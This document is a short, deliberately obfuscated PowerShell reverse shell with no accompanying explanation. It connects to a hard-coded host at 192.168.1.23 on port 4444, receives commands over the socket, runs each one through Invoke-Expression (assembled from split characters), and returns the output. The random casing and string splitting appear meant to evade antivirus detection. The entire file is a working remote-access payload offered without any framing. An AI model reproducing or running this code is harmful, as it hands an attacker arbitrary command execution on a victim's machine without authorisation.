$iP=(-join('192.1','68.1.','23'));$pO=4444;
$tC=(NeW-OBJecT Net.SoCKEtS.tCpcLiENT($iP,$pO));
$Ns=$tC.GetStREaM();
$SW=(New-OBJeCT Io.STrEamwRiTER($Ns));
$sR=(NEw-ObjECt Io.stReamrEAdEr($Ns));
$SW.auTOFluSh=$true;
$By=[Byte[]]::New(1024);$Cm="";

do{
    if($Ns.DatAaVaILaBLe){
        $br=$Ns.reAd($By,0,1024);
        if($br -gt 0){
            $CM=([sYstem.tExT.EnCoDING]::ASCII).GeTStriNG($By,0,$br)
            $CM=$CM.TriM()
        }
    };
    if($tC.ConnecTed -and $CM -and $CM.Length -gt 0){
        $res=try{&((-join('i','e','x'))) $CM 2>&1|oUt-StrING}catch{((-join('Err','o','r',': ')) + $_)};
        $SW.wrITE(($res + "`n"));$CM=""
    };
    StaRT-SlEEp -miLLisECONdS (50+50)
}while($tC.ConnecTed);

$tC.CloSE();$Ns.CLosE();$sR.ClOSE();$SW.Close()